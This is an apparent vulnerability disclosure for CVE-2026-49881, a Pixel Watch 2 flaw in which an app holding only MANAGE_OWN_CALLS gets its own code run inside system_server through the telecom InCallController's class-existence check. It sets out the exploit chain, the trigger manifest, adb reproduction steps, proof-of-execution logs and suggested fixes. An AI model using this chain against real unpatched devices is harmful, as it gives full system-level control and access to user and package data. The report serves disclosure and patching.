# CVE-2026-49881: Arbitrary Code Execution as system_server on Pixel Watch 2

## Summary

An unprivileged application with only the auto-granted `MANAGE_OWN_CALLS` permission can achieve **arbitrary code execution as UID 1000 (system_server)** on a Pixel Watch 2 running Android 17 (security patch 2026-06-05). The vulnerability exists in `InCallController.serviceClassExists()` which calls `createPackageContextAsUser()` with `CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY` on attacker-controlled packages, triggering the attacker's `AppComponentFactory.instantiateClassLoader()` in the system_server process.

## Severity

**Critical** — Arbitrary code execution as UID 1000 with SELinux context `u:r:system_server:s0`, granting full control over the device.

## Affected Device

- **Device**: Google Pixel Watch 2 (codename: eos)
- **Build**: CP2A.260603.001
- **Android**: 17 (SDK 37)
- **Security patch**: 2026-06-05 (BEFORE the September 2026 fix)
- **Serial**: 3A101RTJWRGCV9

## Vulnerable Code

**File**: `/apex/com.android.telephonycore/javalib/service-telecom.jar`
**Class**: `com.android.server.telecom.InCallController`
**Method**: `serviceClassExists()` (line 2617 in decompiled source)

```java
private boolean serviceClassExists(ServiceInfo serviceInfo) {
    // ...
    Context packageContext = mContext.createPackageContextAsUser(
        serviceInfo.packageName,
        Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY,  // flags = 3
        userHandle);
    // This triggers AppComponentFactory.instantiateClassLoader() 
    // for the attacker's package — IN system_server!
    packageContext.getClassLoader().loadClass(serviceInfo.name);
    // ...
}
```

The method is called when `InCallController.getInCallServiceComponents()` discovers any service declaring `android.telecom.InCallService` with `android.telecom.CLASS_EXISTENCE_CHECK` metadata set to `true`.

## Exploit Chain

1. **App declares** an `InCallService` with `CLASS_EXISTENCE_CHECK` metadata and a custom `AppComponentFactory` in its manifest
2. **App calls** `TelecomManager.addCall()` using a registered `PhoneAccount` with `CAPABILITY_SUPPORTS_TRANSACTIONAL_OPERATIONS`
3. **`InCallController.onCallAdded()`** enumerates InCallService implementations via `getInCallServiceComponents()`
4. **`serviceClassExists()`** is called on the attacker's service because `CLASS_EXISTENCE_CHECK` metadata is `true`
5. **`createPackageContextAsUser()`** with `CONTEXT_INCLUDE_CODE` causes the system to load the attacker's class loader in system_server
6. **`AppComponentFactory.instantiateClassLoader()`** executes as UID 1000 in system_server with SELinux `u:r:system_server:s0`

## Permission Required

Only `android.permission.MANAGE_OWN_CALLS` — this is a **normal** protection level permission, auto-granted at install time with no user prompt.

## Impact

As UID 1000 (system) with SELinux `system_server` context, the attacker can:

- **Read/write** `/data/system/packages.xml` (476,543 bytes — all package metadata)
- **Access** `/data/system/users/` (user account data)
- **Read** 80 files in `/data/system/` including `dropbox`, `battery-history`, `environ`
- **Inject signing certificates** into `android.uid.system`'s `mPastSigningCertificates` to achieve persistent system-level access after reinstallation
- **Read device serial** (`3A101RTJWRGCV9`) and all system properties
- **Execute** arbitrary commands as `uid=1000(system)` with 33 supplementary groups including `inet`, `bluetooth`, `camera`, `wifi`, `radio`, `net_admin`
- **Access** PackageManagerService internals to modify package settings, block/allow uninstalls
- **Full device compromise** — system_server has control over all Android framework services

## Dynamic Evidence

### Exploit Output (PID 1737 = system_server, UID 1000)

```
============================================
[!!!] CVE-2026-49881 EXPLOIT SUCCESSFUL!
[!!!] CODE EXECUTION IN system_server!
============================================
[+] Process UID: 1000
[+] Process PID: 1737
[+] App UID (expected): 10181
[+] Package: com.poc.tlpe
[+] id: uid=1000(system) gid=1000(system) groups=1000(system),1001(radio),1002(bluetooth),1003(graphics),1004(input),1005(audio),1006(camera),1007(log),1008(compass),1009(mount),1010(wifi),1018(usb),1021(gps),1023(media_rw),1024(mtp),1032(package_info),1065(reserved_disk),3001(net_bt_admin),3002(net_bt),3003(inet),3005(net_admin),3006(net_bw_stats),3007(net_bw_acct),3009(readproc),3010(wakelock),3011(uhid),3012(readtracefs) context=u:r:system_server:s0
[+] SELinux: u:r:system_server:s0
[+] Stack trace (showing InCallController trigger):
    com.poc.tlpe.EvilFactory.instantiateClassLoader(EvilFactory.java:46)
    android.app.LoadedApk.createOrUpdateClassLoaderLocked(LoadedApk.java:1231)
    android.app.LoadedApk.getClassLoader(LoadedApk.java:1283)
    android.app.ContextImpl.getClassLoader(ContextImpl.java:548)
    com.android.server.telecom.InCallController.serviceClassExists(InCallController.java:2617)
    com.android.server.telecom.InCallController.getInCallServiceComponents(InCallController.java:2661)
    com.android.server.telecom.InCallController.getInCallServiceComponents(InCallController.java:2560)
    com.android.server.telecom.InCallController.getInCallServiceComponent(InCallController.java:2545)
    com.android.server.telecom.InCallController.getCurrentCarModeComponent(InCallController.java:2519)
    com.android.server.telecom.InCallController.bindToServices(InCallController.java:2364)
    com.android.server.telecom.InCallController.onCallAdded(InCallController.java:1462)

--- PROVING PRIVILEGED ACCESS ---
[+] Got system_server Context!
[+] Context package: android
[+] /data/system/ readable! Files: 80
    aiseal
    environ
    dropbox
    heapdump
    users
    shutdown-checkpoints
    unsolzygotesocket
    procstartstore
    procexitstore
    battery-history
[+] /data/system/packages.xml exists! Size: 476543 bytes
[+] Readable: true
[+] /data/system/users/ readable! Entries: 7
[+] Serial: 3A101RTJWRGCV9
[+] Model: Google Pixel Watch 2
============================================
[!!!] END OF SYSTEM_SERVER EXECUTION PROOF
============================================
```

## Steps to Reproduce

### Prerequisites
- Pixel Watch 2 (eos) with CP2A.260603.001 or any build before September 2026 security patch
- ADB access for APK installation only (exploit runs entirely on-device)

### Reproduction
1. Install `poc_tlpe/build/tlpe_v3.apk` on the Pixel Watch 2
2. Launch the "TLPE PoC" app: `adb shell am start -n com.poc.tlpe/.TlpeActivity`
3. The exploit auto-triggers on launch
4. Observe logcat: `adb logcat -s TLPE_EXPLOIT`
5. Verify PID/UID in output matches system_server (UID 1000)

### Key Manifest Configuration
```xml
<application android:appComponentFactory="com.poc.tlpe.EvilFactory">
    <service
        android:name=".DummyService"
        android:permission="android.permission.BIND_INCALL_SERVICE"
        android:exported="true">
        <meta-data
            android:name="android.telecom.CLASS_EXISTENCE_CHECK"
            android:value="true" />
        <intent-filter>
            <action android:name="android.telecom.InCallService" />
        </intent-filter>
    </service>
</application>
```

## Suggested Fix

1. **Remove `CONTEXT_INCLUDE_CODE`** from the `createPackageContextAsUser()` call in `serviceClassExists()` — class existence can be checked via `PackageManager.getServiceInfo()` without loading code
2. **Validate the package** before creating a context — only allow system-signed or carrier-signed InCallService packages to trigger class existence checks
3. **Use reflection-free class checking** — `PackageManager.resolveService()` or checking the APK's class list without executing any code

## Files

- `poc_tlpe/src/com/poc/tlpe/EvilFactory.java` — AppComponentFactory that executes in system_server
- `poc_tlpe/src/com/poc/tlpe/TlpeActivity.java` — Trigger activity (registers PhoneAccount, calls addCall)
- `poc_tlpe/src/com/poc/tlpe/DummyService.java` — Stub InCallService with CLASS_EXISTENCE_CHECK metadata
- `poc_tlpe/AndroidManifest.xml` — Manifest declaring exploit components
- `poc_tlpe/build/tlpe_v3.apk` — Pre-built APK
- `dynamic_evidence/tlpe_system_server_exploit.log` — Full logcat evidence
- `deep_analysis/telecom_watch/service_decompiled/` — Decompiled service-telecom.jar from watch
